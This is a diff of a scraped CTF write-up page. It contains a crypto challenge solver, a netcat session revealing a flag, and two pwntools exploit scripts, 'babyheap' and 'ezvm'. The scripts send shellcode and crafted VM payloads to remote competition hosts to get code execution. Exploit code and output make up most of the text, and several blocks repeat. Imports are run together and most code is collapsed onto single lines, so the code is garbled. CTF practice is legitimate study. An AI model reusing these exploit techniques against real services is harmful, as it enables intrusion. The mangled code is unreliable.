@@ -3,15 +3,20 @@
 > 原文: https://www.ctfiot.com/58888.html
 > ID: 58888
 
-from Crypto.Util.number import *import gmpy2import binasciifrom string import ascii_letters, digitsfrom hashlib import sha256, sha384from itertools import producttable = ascii_letters + digits + '!#$%&*-?'
+from Crypto.Util.number import *import gmpy2import binascii
+from string import ascii_letters, digits
+from hashlib import sha256, sha384
+from itertools import producttable = ascii_letters + digits + '!#$%&*-?'
 def proof_of_work(tail,_hash): print('开始爆破！') for i in product(table, repeat=4): head = ''.join(i) t = hashlib.sha256((head + tail).encode()).hexdigest() if t == _hash: print('爆破成功！结果是：', end='') print(head) break tail = input("tail:")_hash = input("_hash:")proof_of_work(tail,_hash) magic_hex = input("请输入：")magic = binascii.unhexlify(magic_hex)magic_num = bytes_to_long(magic)for i in range(65536): n = magic_num * 2 ** (384 - LEN*8) + i * 2 ** (384 - LEN*8 - 16) if is_prime(n + 1): f = factor(n) if all(p < 2 ** 40 for p, e in f): print(f) num1 = primitive_root(n+1) data = str(hex(int(num1)))[2:].encode() data2 = sha384(data).hexdigest() num2 = int(data2, 16) e = discrete_log(Zmod(n+1)(num2), Zmod(n+1)(num1)) if int(pow(num1, e, n+1)) == num2 % (n+1): print('solved') P = str(hex(n+1))[2:] E = str(hex(e)[2:]) print("P:", P, len(P), gmpy2.is_prime(n+1)) print("E:", E, len(E)) print("data:", data, len(data)) break   # nc 202.120.7.219 15555
 
-```(base) 0HB@Caliburn ~ % nc 202.120.7.219 15555sha256(XXXX + t&YJ0I8OkC&DcMru) == a2c0e15904cfe04ed507cc8749777b04f4a8d271798245f2e5a411fbbf141cfeGive me XXXX:%no5cabb40d38331a1e7ac25cc5d6f95b595adP:>cabb40d38331a1e7ac25cc5d6f95b595ad10fc0000000000000000000000000000000000000000000000000000000001E:>4df0bc855e3135b6f49868603d78cefe90a8354ac47b623453ad6cdde24ecf73d8f693b5fd1bd5ffa5bb80ae0794876fdata:>3flag{Hope_you_can_solve_by_smoothness_this_time}```
-
-```python#!/usr/bin/python3# -*- coding:utf-8 -*-
+```(base) 0HB@Caliburn ~ % nc 202.120.7.219 15555sha256(XXXX + t&YJ0I8OkC&DcMru) == a2c0e15904cfe04ed507cc8749777b04f4a8d271798245f2e5a411fbbf141cfeGive me XXXX:%no5cabb40d38331a1e7ac25cc5d6f95b595adP:>cabb40d38331a1e7ac25cc5d6f95b595ad10fc0000000000000000000000000000000000000000000000000000000001E:>4df0bc855e3135b6f49868603d78cefe90a8354ac47b623453ad6cdde24ecf73d8f693b5fd1bd5ffa5bb80ae0794876fdata:>3flag{Hope_you_can_solve_by_smoothness_this_time}python#!/usr/bin/python3
+# -*- coding:
+utf-8 -*-
 from pwn import *import os, struct, random, time, sys, signal
 libc = ELF('libc-2.35.so')
-class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
+class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:
+bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
+bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
  def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
  def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
  def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
@@ -27,12 +32,14 @@ sh = Shell()sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.add(0x208, b'')
  mov edi, eax mov rsi, rsp mov edx, 0x01010201 sub edx, 0x01010101 xor eax, eax syscall ;// read
  mov edx, eax mov rsi, rsp xor eax, eax inc eax mov edi, eax syscall ;// write
 over: xor edi, edi mov eax, 0x010101e8 sub eax, 0x01010101 syscall ;// exit'''))sh.sendlineafter(b'Command: ', b'5')sh.interactive()
-```
-
-```python#!/usr/bin/python3# -*- coding:utf-8 -*-
+python#!/usr/bin/python3
+# -*- coding:
+utf-8 -*-
 from pwn import *import os, struct, random, time, sys, signal
 libc = ELF('libc-2.35.so')
-class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
+class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:
+bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
+bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
  def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
  def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
  def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
@@ -54,27 +61,20 @@ payload += p8(21) + p8(3) + p64(0)
 payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(0xebcf1)payload += p8(0) + p8(3)payload += p8(2)
 sh.sendlineafter(b'code:n', payload + p8(1))
 sh.interactive()
-```
-
-
-```
-from Crypto.Util.number import *import gmpy2import binasciifrom string import ascii_letters, digitsfrom hashlib import sha256, sha384from itertools import producttable = ascii_letters + digits + '!#$%&*-?'
+from Crypto.Util.number import *import gmpy2import binascii
+from string import ascii_letters, digits
+from hashlib import sha256, sha384
+from itertools import producttable = ascii_letters + digits + '!#$%&*-?'
 def proof_of_work(tail,_hash): print('开始爆破！') for i in product(table, repeat=4): head = ''.join(i) t = hashlib.sha256((head + tail).encode()).hexdigest() if t == _hash: print('爆破成功！结果是：', end='') print(head) break tail = input("tail:")_hash = input("_hash:")proof_of_work(tail,_hash) magic_hex = input("请输入：")magic = binascii.unhexlify(magic_hex)magic_num = bytes_to_long(magic)for i in range(65536): n = magic_num * 2 ** (384 - LEN*8) + i * 2 ** (384 - LEN*8 - 16) if is_prime(n + 1): f = factor(n) if all(p < 2 ** 40 for p, e in f): print(f) num1 = primitive_root(n+1) data = str(hex(int(num1)))[2:].encode() data2 = sha384(data).hexdigest() num2 = int(data2, 16) e = discrete_log(Zmod(n+1)(num2), Zmod(n+1)(num1)) if int(pow(num1, e, n+1)) == num2 % (n+1): print('solved') P = str(hex(n+1))[2:] E = str(hex(e)[2:]) print("P:", P, len(P), gmpy2.is_prime(n+1)) print("E:", E, len(E)) print("data:", data, len(data)) break   # nc 202.120.7.219 15555
-```
-
-
-
-```
 ```(base) 0HB@Caliburn ~ % nc 202.120.7.219 15555sha256(XXXX + t&YJ0I8OkC&DcMru) == a2c0e15904cfe04ed507cc8749777b04f4a8d271798245f2e5a411fbbf141cfeGive me XXXX:%no5cabb40d38331a1e7ac25cc5d6f95b595adP:>cabb40d38331a1e7ac25cc5d6f95b595ad10fc0000000000000000000000000000000000000000000000000000000001E:>4df0bc855e3135b6f49868603d78cefe90a8354ac47b623453ad6cdde24ecf73d8f693b5fd1bd5ffa5bb80ae0794876fdata:>3flag{Hope_you_can_solve_by_smoothness_this_time}```
-```
-
-
-
-```
-```python#!/usr/bin/python3# -*- coding:utf-8 -*-
+```python#!/usr/bin/python3
+# -*- coding:
+utf-8 -*-
 from pwn import *import os, struct, random, time, sys, signal
 libc = ELF('libc-2.35.so')
-class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
+class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:
+bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
+bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
  def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
  def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
  def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
@@ -91,15 +91,14 @@ sh = Shell()sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.add(0x208, b'')
  mov edx, eax mov rsi, rsp xor eax, eax inc eax mov edi, eax syscall ;// write
 over: xor edi, edi mov eax, 0x010101e8 sub eax, 0x01010101 syscall ;// exit'''))sh.sendlineafter(b'Command: ', b'5')sh.interactive()
 ```
-```
-
-
-
-```
-```python#!/usr/bin/python3# -*- coding:utf-8 -*-
+```python#!/usr/bin/python3
+# -*- coding:
+utf-8 -*-
 from pwn import *import os, struct, random, time, sys, signal
 libc = ELF('libc-2.35.so')
-class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
+class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:
+bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
+bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
  def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
  def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
  def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
